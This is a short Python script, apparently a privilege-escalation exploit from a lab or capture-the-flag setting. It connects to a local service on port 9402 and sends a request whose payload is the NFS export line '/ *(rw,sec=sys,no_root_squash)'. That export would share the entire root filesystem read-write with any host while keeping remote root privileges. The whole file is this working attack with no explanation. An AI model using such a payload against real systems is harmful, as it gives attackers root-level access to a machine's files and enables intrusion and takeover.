import socket
import json

req = json.dumps({
    'op_code': 1000,
    'payload': '/ *(rw,sec=sys,no_root_squash)'
})

s = socket.socket()
s.connect(('localhost', 9402))

s.send(len(req).to_bytes(4, 'big', signed=True))
s.send(req.encode())

buf = s.recv(4)
count = int.from_bytes(buf, 'big', signed=True)
print(count)

buf = s.recv(count)
print(buf.decode('utf-8'))

